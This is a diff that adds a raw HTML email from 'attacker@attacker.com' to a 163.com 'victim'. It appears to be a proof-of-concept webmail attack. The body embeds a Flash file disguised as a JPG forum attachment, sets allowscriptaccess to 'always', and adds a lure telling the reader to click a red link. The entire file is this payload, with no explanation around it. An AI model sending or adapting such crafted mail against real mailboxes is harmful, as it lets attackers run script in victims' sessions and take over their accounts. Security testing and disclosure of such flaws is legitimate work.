@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: 123
+To: victim@163.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<embed code="http://fm.163.com/bbs/attachments/month_1112/11120820515cde193ce2d3a9fe.jpg" _src="http://fm.163.com/bbs/attachments/month_1112/11120820515cde193ce2d3a9fe.jpg" quality="high" bgcolor="#FFFFFF" volume="0" wmode="transparent" name="myMovieName" type="application/x-shockwave-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" alt="if you can't see this card, please check the red link" allowscriptaccess="always" align="" height="400" width="500">
